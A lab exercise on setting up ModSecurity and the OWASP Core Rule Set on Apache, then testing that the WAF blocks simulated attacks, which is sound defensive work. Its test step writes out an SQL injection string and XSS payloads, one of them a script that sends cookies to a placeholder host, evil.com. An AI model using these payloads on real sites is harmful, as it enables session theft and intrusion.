# Overview
Configure ModSecurity as a WAF on an Apache web server, apply basic security rules, and test how it detects and blocks suspicious activity.

## Setup Requirements
**Apache Web Server:** Install Apache if not already set up.

**ModSecurity:** An open-source WAF module compatible with Apache, available for most Linux distributions.

Installation Commands (for Red Hat-based systems):
```bash
sudo yum install httpd mod_security mod_security_crs -y
```
# Exercise
## Step 1: Enable and Configure ModSecurity
**Enable ModSecurity:**
- The default ModSecurity configuration file should already be available at `/etc/httpd/conf.d/mod_security.conf`.
- Verify the configuration file and set SecRuleEngine to On:
```bash
sudo vim /etc/httpd/conf.d/mod_security.conf
```
- Find the line for SecRuleEngine and set it to On:
```bash
SecRuleEngine On
```
- Save and close the file. ( if you have never used VIM before this is how you do it: [Click here](https://builtin.com/articles/how-to-exit-vim#:~:text=Save%20and%20exit%3A%20If%20you,command.))

**Restart Apache** to apply changes:
```bash
sudo systemctl restart httpd
```
Enabling ModSecurity allows it to actively monitor, detect, and block suspicious traffic according to its configured rules.

## Step 2: Apply Core Rule Set (CRS) for Basic Protection
**Enable the OWASP ModSecurity Core Rule Set (CRS):**

- ModSecurity CRS should already be installed with the package `mod_security_crs`.
- Navigate to the CRS directory and link the configuration to the ModSecurity directory:

```bash
cd /etc/httpd/modsecurity.d/
sudo cp /usr/share/mod_security_crs/modsecurity_crs_10_setup.conf.example modsecurity_crs_10_setup.conf
```
- **Include the CRS rules** in your main ModSecurity configuration file:
```bash
sudo vim /etc/httpd/conf.d/mod_security.conf
```
- At the end of the file, add:
```bash
IncludeOptional /usr/share/mod_security_crs/*.conf
```
**Restart Apache:**
```bash
sudo systemctl restart httpd
```
The CRS provides essential protection against common web attacks (e.g., SQL injection, XSS).

## Step 3: Test the WAF with Simulated Attacks
### Verify Basic Functionality:

- Open a browser and navigate to your server’s IP or domain (e.g., http://localhost).
- The server should load your default Apache page, confirming that the WAF isn’t blocking normal traffic.

### Test SQL Injection Protection:
In the browser, simulate an SQL injection attempt by adding a parameter with SQL code:
- Do this in your browsers address bar.
```bash
http://localhost/products.php?id=1 OR 1=1
```

**Expected Result:** ModSecurity should block this request, showing a **403 Forbidden** error.

### Test Cross-Site Scripting (XSS) Protection:
Simulate an XSS attack by adding a script tag in the URL:
- Do this in your browsers address bar
```bash
http://localhost/search.php?q=<script>alert('Hacked!')</script>
```
or
```bash
http://localhost/search.php?q=<script>document.location='http://evil.com/steal.php?cookie='+document.cookie</script>
```
If executed, this sends the user's cookies (possibly containing session info) to the attacker's server.

**Expected Result:** The WAF should block this request as well, returning a **403 Forbidden** error.

## Review WAF Logs:
ModSecurity logs all detected attacks in the Apache error log:
```bash
sudo cat /var/log/httpd/modsec_audit.log
```
Review the log entries for details about the blocked SQL injection and XSS attempts, including information on the triggered rules.

**Explanation:** ModSecurity detects and blocks requests that match its rules, effectively protecting against common web vulnerabilities.

## Summary
- Basic WAF Configuration: Configured ModSecurity as a WAF with Apache, enabling detection and blocking of web-based attacks.
- Core Rule Set (CRS): Applied standard rules to protect against common attacks like SQL injection and XSS.
- Attack Simulation: Tested WAF by simulating common attacks and observing the response.
- Logging and Analysis: Used ModSecurity’s logs to analyze and understand blocked attacks.
